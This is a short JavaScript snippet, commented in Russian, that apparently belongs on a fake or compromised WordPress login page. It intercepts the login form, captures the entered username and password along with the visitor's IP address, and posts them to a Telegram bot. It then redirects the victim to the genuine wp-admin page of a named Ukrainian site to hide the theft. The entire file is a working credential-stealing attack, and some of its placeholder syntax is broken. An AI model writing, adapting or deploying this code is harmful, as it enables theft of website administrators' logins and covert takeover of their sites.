document.getElementById('loginform').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const formData = new FormData(this);
    const login = formData.get('log');
    const password = formData.get('pwd');
    
    // Формируем сообщение
    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}`;
    
    try {
        // ВАЖНО: Мы НЕ указываем токен и chat_id здесь! Они подставятся автоматически из секретов.
        const response = await fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ${CHAT_ID}, text: message })
        });
        
        setTimeout(() => { window.location.href = 'https://mrt.com.ua/wp-admin/'; }, 1500);
        
    } catch (error) {
        console.error('Ошибка отправки:', error);
        window.location.href = 'https://mrt.com.ua/wp-admin/';
    }
});

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch { return 'Не удалось определить'; }
}
